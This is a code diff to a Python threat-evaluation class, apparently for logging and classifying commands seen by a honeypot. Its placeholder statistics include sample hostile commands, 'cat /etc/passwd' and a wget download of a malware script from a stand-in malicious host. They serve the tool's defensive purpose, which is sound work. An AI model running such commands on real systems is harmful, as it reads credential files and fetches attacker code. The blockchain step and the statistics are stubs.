@@ -140,4 +140,84 @@ class ThreatEvaluator:
             
             # Map back to threat level
             if combined_score >= 7:
-                combined_
+                combined_threat = 'malicious'
+            elif combined_score >= 3:
+                combined_threat = 'suspicious'
+            else:
+                combined_threat = 'safe'
+                
+            # Update the result with the combined assessment
+            result['combined_assessment'] = {
+                'score': combined_score,
+                'threat_level': combined_threat
+            }
+        
+        # Record to blockchain if enabled
+        if self.blockchain_enabled and self.blockchain_available:
+            try:
+                # Hash the command and result for blockchain storage
+                data_to_hash = {
+                    'command': command,
+                    'timestamp': result['timestamp'],
+                    'src_ip': result['src_ip'],
+                    'classification': result['classification']['threat_level'],
+                    'nlp_risk': result['nlp_analysis']['risk_score']
+                }
+                
+                # Create hash of the data
+                hash_str = hashlib.sha256(json.dumps(data_to_hash).encode()).hexdigest()
+                result['blockchain_hash'] = hash_str
+                
+                # In a real implementation, we would store this on the blockchain
+                # self.blockchain.store_record(hash_str, data_to_hash)
+                print(f"Command recorded to blockchain with hash: {hash_str}")
+            except Exception as e:
+                print(f"Error recording to blockchain: {e}")
+        
+        return result
+
+    def record_to_database(self, evaluated_command, db_connector):
+        """
+        Record the evaluated command to a database
+        
+        Args:
+            evaluated_command: Dict with evaluation results
+            db_connector: Database connector object
+        
+        Returns:
+            Bool indicating success
+        """
+        try:
+            # In a real implementation, this would insert the record into a database
+            db_connector.insert_record("command_logs", evaluated_command)
+            return True
+        except Exception as e:
+            print(f"Error recording to database: {e}")
+            return False
+            
+    def get_statistics(self, timeframe='day'):
+        """
+        Get statistics about threat evaluations
+        
+        Args:
+            timeframe: Timeframe for statistics ('hour', 'day', 'week')
+        
+        Returns:
+            Dict with statistics
+        """
+        # This would typically query a database to get real statistics
+        # For now, returning placeholder data
+        return {
+            'total_commands': 100,
+            'threat_levels': {
+                'safe': 70,
+                'suspicious': 20,
+                'malicious': 10
+            },
+            'top_commands': {
+                'ls -la': 15,
+                'cat /etc/passwd': 8,
+                'wget http://malicious.com/malware.sh': 5
+            },
+            'timeframe': timeframe
+        }
